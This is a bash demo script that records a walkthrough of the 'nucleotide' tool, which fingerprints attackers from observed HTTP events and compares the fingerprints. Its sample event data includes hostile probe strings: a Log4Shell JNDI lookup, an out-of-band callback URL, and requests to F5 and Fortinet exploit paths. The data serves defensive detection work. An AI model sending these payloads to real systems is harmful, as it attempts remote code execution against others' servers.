#!/usr/bin/env bash
# Reproducible source for docs/demos/fingerprint-actor.cast.
# Run standalone with:
#   asciinema rec -q --cols 90 -c docs/demos/fingerprint-actor.sh \
#                 docs/demos/fingerprint-actor.cast
#
# Walkthrough: turn a batch of observed HTTP events into an actor
# fingerprint YAML, compare two fingerprints, and score a fresh batch
# against a saved reference.
set -e

pause() { sleep "${1:-0.6}"; }
say()   { printf "\033[1;36m$ %s\033[0m\n" "$*"; pause; eval "$@"; pause 1; }

WORK=$(mktemp -d)
cd "$WORK"

echo "# 0. Build a lookup so we have templates to match against."
pause 1
nucleotide build --templates-dir /home/user/nucleotide/tests/fixtures \
                 --out lookup.json 2>/dev/null
echo "  (lookup.json built)"
pause 1

echo "# 1. An operator hands us a batch of events they've already"
echo "#    grouped as 'this looks like one actor'. JSONL, one line each."
pause 1

cat > events.jsonl <<'EOF'
{"ts":"2026-07-02T14:00:00Z","src_ip":"198.51.100.42","target":"victim.example","uri":"/?x=${jndi:ldap://x/y}","ua":"Nuclei - Open-source project","body":"cb=http://a1.oast.online/x"}
{"ts":"2026-07-02T14:00:01Z","src_ip":"198.51.100.42","target":"victim.example","uri":"/mgmt/tm/util/bash","ua":"Nuclei - Open-source project"}
{"ts":"2026-07-02T14:00:02Z","src_ip":"198.51.100.42","target":"victim.example","uri":"/saml/login","ua":"Nuclei - Open-source project"}
EOF

say "wc -l events.jsonl && head -1 events.jsonl"
pause 1

echo "# 2. Turn the events into an actor fingerprint YAML."
say "nucleotide fingerprint events.jsonl --lookup lookup.json \\
      --actor-id apt-demo --out actor.yml"
pause 1

echo "# The output captures tool inference, CLI options, template preference."
say "head -18 actor.yml"
pause 1

echo "# 3. Same events, same fingerprint. Compare is a nop."
say "nucleotide compare actor.yml actor.yml"
pause 1

echo "# 4. Fresh events, slightly drifted (added a Fortinet CVE probe)."
cat >> events.jsonl <<'EOF'
{"ts":"2026-07-02T14:00:03Z","src_ip":"198.51.100.42","target":"victim.example","uri":"/api/v2/authentication/session","ua":"Nuclei - Open-source project"}
EOF
pause 0.5

say "nucleotide match events.jsonl actor.yml --lookup lookup.json"
pause 1

echo "# Non-1.0 match_score = drift. Saved fingerprints stay comparable"
echo "# across observation windows and different SIEM pipelines."
pause 1.5

echo "# Done. Artifacts in $WORK/"
